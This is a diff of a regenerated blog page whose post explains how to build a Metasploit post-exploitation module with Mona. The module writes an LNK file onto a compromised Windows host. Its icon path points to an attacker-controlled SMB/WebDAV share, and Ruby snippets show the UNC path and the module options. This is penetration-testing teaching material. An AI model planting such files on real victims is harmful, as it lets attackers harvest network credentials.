@@ -32,8 +32,8 @@
 
 
 <meta itemprop="name" content="Developing the LNK Metasploit post module with Mona">
-<meta itemprop="description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target."><meta itemprop="datePublished" content="2012-02-19T05:57:02&#43;00:00" />
-<meta itemprop="dateModified" content="2012-02-19T05:57:02&#43;00:00" />
+<meta itemprop="description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target."><meta itemprop="datePublished" content="2012-02-19T05:57:02+00:00" />
+<meta itemprop="dateModified" content="2012-02-19T05:57:02+00:00" />
 <meta itemprop="wordCount" content="666">
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
@@ -52,7 +52,7 @@
 
 
 
-    <meta property="article:published_time" content="2012-02-19 05:57:02 &#43;0000 &#43;0000" />
+    <meta property="article:published_time" content="2012-02-19 05:57:02 &#43;0000 UTC" />
 
 
 
@@ -135,8 +135,8 @@
 <p><code>“!mona header C:\autoexec.lnk”</code></p>
 <p><img src="/images/postimages/201202_mona_2.png" alt=""></p>
 <p>As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">header <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;C:\%</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">192.168.100.100</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">w00t</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bogusimage.png`&#34;</span>)
-</code></pre></div><p>I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>header <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;C:\%</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">192.168.100.100</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">w00t</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bogusimage.png`&#34;</span>)
+</span></span></code></pre></div><p>I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.</p>
 <p>Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?</p>
 <p>Now I have 3 challenges:</p>
 <ol>
@@ -145,17 +145,17 @@
 <li>It needs to be up to code on the Metasploit coding standards</li>
 </ol>
 <p>Changing the line I found for the share name into this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">lnk <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;LHOST&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SHARENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ICONFILENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`&#34;</span>)
-</code></pre></div><p>‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">OptAddressRange</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;LHOST&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;Host listening for incoming SMB/WebDAV traffic&#34;</span>, <span style="color:#66d9ef">nil</span><span style="color:#f92672">]</span>),
-<span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;SHARENAME&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;Share name on LHOST&#34;</span>, <span style="color:#e6db74">&#34;share1&#34;</span><span style="color:#f92672">]</span>),       
-<span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;ICONFILENAME&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;File name on LHOST&#39;s share&#34;</span>, <span style="color:#e6db74">&#34;icon.png&#34;</span><span style="color:#f92672">]</span>)
-</code></pre></div><p>OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>lnk <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;LHOST&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SHARENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ICONFILENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`&#34;</span>)
+</span></span></code></pre></div><p>‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">OptAddressRange</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;LHOST&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;Host listening for incoming SMB/WebDAV traffic&#34;</span>, <span style="color:#66d9ef">nil</span><span style="color:#f92672">]</span>),
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;SHARENAME&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;Share name on LHOST&#34;</span>, <span style="color:#e6db74">&#34;share1&#34;</span><span style="color:#f92672">]</span>),       
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;ICONFILENAME&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;File name on LHOST&#39;s share&#34;</span>, <span style="color:#e6db74">&#34;icon.png&#34;</span><span style="color:#f92672">]</span>)
+</span></span></code></pre></div><p>OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.</p>
 <p>Problem 1 solved. Problem 2 was just as easy, the following line:</p>
-<pre><code>file = client.fs.file.new(datastore['LNKFILENAME'], 'wb')
+<pre tabindex="0"><code>file = client.fs.file.new(datastore[&#39;LNKFILENAME&#39;], &#39;wb&#39;)
 </code></pre><p>creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.</p>
 <p>Problem 3 is much more tricky, but here is the path to wisdom:</p>
-<pre><code>ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
+<pre tabindex="0"><code>ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
 </code></pre><p>Hope this helps spur people into trying their hand at developing some modules of their own.</p>
 
             </div>
@@ -184,7 +184,7 @@
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -192,7 +192,7 @@
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -205,7 +205,7 @@
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
